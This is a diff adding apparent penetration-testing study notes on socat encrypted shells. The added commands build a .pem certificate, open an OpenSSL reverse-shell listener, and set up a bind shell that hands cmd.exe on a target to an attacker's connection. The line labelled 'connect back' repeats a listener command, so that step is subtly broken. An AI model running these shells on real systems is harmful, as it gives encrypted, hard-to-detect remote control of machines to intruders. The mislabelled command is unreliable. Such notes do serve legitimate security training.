@@ -79,3 +79,14 @@ right: compromised target
 
 ### Socat Encrypted Shells  
 `openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`: generate a certificate (on an attacking machine is easy)  
+`cat shell.key shell.crt > shell.pem`: merge the two created files into a single `.pem` file  
+`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`: set up a reverse shell listener  
+`verify=0`: not bother trying to validate  
+`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`: connect back  
+Bind shell  
+Target:
+`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`
+Attacker:
+`socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`
+
+
